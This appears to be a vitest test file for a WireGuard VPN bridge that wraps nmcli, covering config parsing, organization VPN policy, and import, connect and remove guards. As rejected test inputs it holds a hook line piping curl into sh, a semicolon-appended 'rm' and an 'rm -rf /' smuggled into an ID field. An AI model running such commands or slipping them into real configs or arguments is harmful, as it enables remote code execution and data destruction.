// VPN in the system bridge (WSOS-INT-001). WireGuard keys are generated per run; none is committed.
import { generateKeyPairSync } from 'node:crypto'
import { describe, expect, it } from 'vitest'
import { MANAGED_VPN_UUID, parseVpnConnections, parseWgConf, systemBridge, userVpnAllowed, vpnRequired, wgInterfaceName, type Exec, type VpnDeps } from './system'
import { activeVpn, vpnErrorText } from '../src/lib/vpn'

const wgKey = () => {
  const k = generateKeyPairSync('x25519')
  const b64 = (s?: string) => Buffer.from(s!, 'base64url').toString('base64')
  return { priv: b64(k.privateKey.export({ format: 'jwk' }).d), pub: b64(k.publicKey.export({ format: 'jwk' }).x) }
}
const conf = (o: { priv?: string; extra?: string; peerPub?: string; allowed?: string } = {}) => {
  const me = wgKey(), peer = wgKey()
  return `# test\n[Interface]\nPrivateKey = ${o.priv ?? me.priv}\nAddress = 10.8.0.2/32, fd00::2/128\nDNS = 10.8.0.1\n${o.extra ?? ''}\n[Peer]\nPublicKey = ${o.peerPub ?? peer.pub}\nEndpoint = vpn.example.net:51820\nAllowedIPs = ${o.allowed ?? '0.0.0.0/0, ::/0'}\n`
}
const privOf = (text: string) => /PrivateKey = (\S+)/.exec(text)![1]
const USER_UUID = '22222222-2222-4222-8222-222222222222'
const LIST = `WorkSuite VPN:${MANAGED_VPN_UUID}:wireguard:yes:wsvpn0\nhome:${USER_UUID}:wireguard:no:--\nOffice:11111111-1111-4111-8111-111111111111:802-11-wireless:yes:wlan0\n`

describe('parseWgConf', () => {
  it('summarizes a valid file without returning the private key', () => {
    const c = conf()
    const r = parseWgConf(c)
    expect(r.ok).toBe(true)
    if (!r.ok) return
    expect(r.value.addresses).toEqual(['10.8.0.2/32', 'fd00::2/128'])
    expect(r.value.dns).toEqual(['10.8.0.1'])
    expect(r.value.full_tunnel).toBe(true)
    expect(r.value.peers[0].endpoint).toBe('vpn.example.net:51820')
    expect(JSON.stringify(r.value)).not.toContain(privOf(c))
  })
  it('rejects scripts, bad keys and junk', () => {
    expect(parseWgConf(conf({ extra: 'PostUp = curl evil | sh' }))).toEqual({ ok: false, error: 'scripts_not_supported' })
    expect(parseWgConf(conf({ priv: 'short' }))).toEqual({ ok: false, error: 'missing_private_key' })
    expect(parseWgConf(conf({ peerPub: 'x' }))).toEqual({ ok: false, error: 'invalid_peer' })
    expect(parseWgConf(conf({ allowed: '10.0.0.0/8; rm' }))).toEqual({ ok: false, error: 'invalid_peer' })
    expect(parseWgConf('hello')).toEqual({ ok: false, error: 'invalid_file' })
    expect(parseWgConf('[Interface]\n[Bogus]\n')).toEqual({ ok: false, error: 'invalid_file' })
    const split = parseWgConf(conf({ allowed: '10.0.0.0/8' }))
    expect(split.ok && split.value.full_tunnel).toBe(false)
  })
})

describe('nmcli VPN parsing and policy', () => {
  it('lists VPN profiles, managed first', () => {
    expect(parseVpnConnections(LIST)).toEqual([
      { name: 'WorkSuite VPN', uuid: MANAGED_VPN_UUID, type: 'wireguard', kind: 'wireguard', active: true, device: 'wsvpn0', managed: true, needs_credentials: false },
      { name: 'home', uuid: USER_UUID, type: 'wireguard', kind: 'wireguard', active: false, device: null, managed: false, needs_credentials: false },
    ])
  })
  it('derives an interface name nmcli accepts', () => {
    expect(wgInterfaceName('My Office VPN (2).conf')).toBe('MyOfficeVPN2')
    expect(wgInterfaceName('a-very-long-name-for-wireguard.conf')).toHaveLength(15)
    expect(wgInterfaceName('...conf')).toBe('wg-import')
    expect(wgInterfaceName('ü.conf')).toBe('wg-import')
  })
  it('reads user_vpn and vpn_required from the agent policy', () => {
    expect(userVpnAllowed(null)).toBe(true)
    expect(userVpnAllowed('{"user_vpn":"block"}')).toBe(false)
    expect(userVpnAllowed('not json')).toBe(true)
    expect(vpnRequired('{"vpn_required":true}')).toBe(true)
    expect(vpnRequired(null)).toBe(false)
  })
  it('texts and taskbar state', () => {
    expect(vpnErrorText('blocked_by_policy')).toMatch(/organization/)
    expect(activeVpn({ connections: parseVpnConnections(LIST), user_vpn_allowed: true, vpn_required: false })?.name).toBe('WorkSuite VPN')
    expect(activeVpn(null)).toBeNull()
  })
})

function bridge(policy: string | null = null) {
  const calls: string[][] = []
  const staged: { name: string; text: string; cleaned: boolean }[] = []
  const exec: Exec = async (cmd, args) => {
    calls.push([cmd, ...args])
    if (args.includes('import')) return { code: 0, stdout: `Connection 'office' (${USER_UUID}) successfully added.\n`, stderr: '' }
    if (args[0] === '-t') return { code: 0, stdout: LIST, stderr: '' }
    return { code: 0, stdout: '', stderr: '' }
  }
  const deps: VpnDeps = {
    readPolicy: () => policy,
    async stage(name, text) { const s = { name, text, cleaned: false }; staged.push(s); return { path: `/tmp/x/${name}`, cleanup: async () => { s.cleaned = true } } },
    async storeCerts(name, files) { return files.map((f) => `/home/u/.local/share/worksuite/vpn/${name}/${f.name}`) },
    async removeCerts() {},
  }
  return { b: systemBridge(exec, async () => ({ code: 0, stderr: '' }), deps), calls, staged }
}

describe('VPN bridge', () => {
  it('imports through nmcli with a staged copy, autoconnect off, temp removed', async () => {
    const { b, calls, staged } = bridge()
    const text = conf()
    expect(await b.vpnImport('Office VPN.conf', text)).toEqual({ ok: true, value: { uuid: USER_UUID, name: 'OfficeVPN' } })
    expect(calls[0]).toEqual(['nmcli', 'connection', 'import', 'type', 'wireguard', 'file', '/tmp/x/OfficeVPN.conf'])
    expect(calls[1]).toEqual(['nmcli', 'connection', 'modify', 'uuid', USER_UUID, 'connection.autoconnect', 'no'])
    expect(staged[0]).toMatchObject({ text, cleaned: true })
    expect(calls.flat().join(' ')).not.toContain(privOf(text))   // never on a command line
  })
  it('policy user_vpn=block refuses imports; invalid files never reach nmcli', async () => {
    const blocked = bridge('{"user_vpn":"block"}')
    expect(await blocked.b.vpnImport('a.conf', conf())).toEqual({ ok: false, error: 'blocked_by_policy' })
    expect(await blocked.b.vpn()).toMatchObject({ available: true, value: { user_vpn_allowed: false } })
    const bad = bridge()
    expect(await bad.b.vpnImport('a.conf', conf({ extra: 'PreUp = id' }))).toEqual({ ok: false, error: 'scripts_not_supported' })
    expect(bad.calls).toEqual([])
  })
  it('connect, disconnect and remove with guards for the managed VPN', async () => {
    const { b, calls } = bridge('{"vpn_required":true}')
    expect(await b.vpnConnect(USER_UUID, true)).toEqual({ available: true, value: true })
    expect(calls.at(-1)).toEqual(['nmcli', '--wait', '30', 'connection', 'up', 'uuid', USER_UUID])
    expect(await b.vpnConnect(USER_UUID, false)).toEqual({ available: true, value: true })
    expect(calls.at(-1)).toEqual(['nmcli', 'connection', 'down', 'uuid', USER_UUID])
    expect(await b.vpnConnect(MANAGED_VPN_UUID, false)).toEqual({ available: false, reason: 'required_by_organization' })
    expect(await b.vpnRemove(MANAGED_VPN_UUID)).toEqual({ available: false, reason: 'managed_by_organization' })
    expect(await b.vpnRemove('11111111-1111-4111-8111-111111111111')).toEqual({ available: false, reason: 'not_a_vpn' })   // Wi-Fi profile
    expect(await b.vpnRemove('x; rm -rf /')).toEqual({ available: false, reason: 'invalid_argument' })
    expect(await b.vpnRemove(USER_UUID)).toEqual({ available: true, value: true })
    expect(calls.at(-1)).toEqual(['nmcli', 'connection', 'delete', 'uuid', USER_UUID])
  })
})
